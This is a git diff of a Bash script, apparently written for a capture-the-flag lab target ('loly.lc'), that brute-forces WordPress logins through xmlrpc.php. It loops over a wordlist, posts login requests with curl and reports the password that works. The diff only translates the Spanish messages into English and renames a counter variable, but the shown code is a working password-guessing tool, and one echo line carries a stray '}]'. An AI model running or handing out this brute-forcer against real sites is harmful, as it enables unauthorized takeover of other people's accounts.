@@ -14,18 +14,18 @@ grayColour="\e[0;37m\033[1m"
 # Functions 
 
 function ctrl_c() {
-  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"}]
+  echo -e "\n\n${redColour}[!] Exiting...${endColour}\n"}]
   tput cnorm; exit 1
 }
 
-declare -i parameter_counter=0
+declare -i c=0
 
 tput civis 
 
 function helpPanel(){
-  echo -e "\n${turquoiseColour}[+]${endColour} Uso: ${yellowColour}$0${blueColour}-u ${redColour}USER ${blueColour}-w${endColour} ${redColour}WORDLIST_PATH${endColour}"
-  echo -e "\t${purpleColour}-u)${endColour} Usuario a probar"
-  echo -e "\t${purpleColour}-w)${endColour} Ruta del Wordlist"
+  echo -e "\n${turquoiseColour}[+]${endColour} Use: ${yellowColour}$0${blueColour}-u ${redColour}USER ${blueColour}-w${endColour} ${redColour}WORDLIST_PATH${endColour}"
+  echo -e "\t${purpleColour}-u)${endColour} User to try."
+  echo -e "\t${purpleColour}-w)${endColour} Wordlist path."
   exit 1 
 }
 
@@ -48,7 +48,7 @@ function makeXML(){
   response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml)
 
   if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
-    echo -e "\n${turquoiseColour}[+]${endColour} La contrasena para el usuario ${redColour}$username${endColour} es ${redColour}$password${endColour}"
+    echo -e "\n${turquoiseColour}[+]${endColour} The password of the user ${redColour}$username${endColour} is ${redColour}$password${endColour}"
     tput cnorm; exit 0
   fi
   done
@@ -59,17 +59,17 @@ trap ctrl_c SIGINT
 
 while getopts "u:w:h" arg; do
   case $arg in
-    u) username=$OPTARG && let parameter_counter+=1;;
-    w) wordlist=$OPTARG && let parameter_counter+=1;;
+    u) username=$OPTARG && let c+=1;;
+    w) wordlist=$OPTARG && let c+=1;;
     h) helpPanel
   esac
 done
 
-if [ $parameter_counter -eq 2 ]; then
+if [ $c -eq 2 ]; then
   if [ -f $wordlist ]; then
     makeXML $username $wordlist
   else
-    echo -e "\n${turquoiseColour}[!]${endColour} La ruta de la ${redColour}wordlist${endColour} no es valida."
+    echo -e "\n${turquoiseColour}[!]${endColour} The path of the ${redColour}wordlist${endColour} isn't valid."
     exit 1
   fi
 
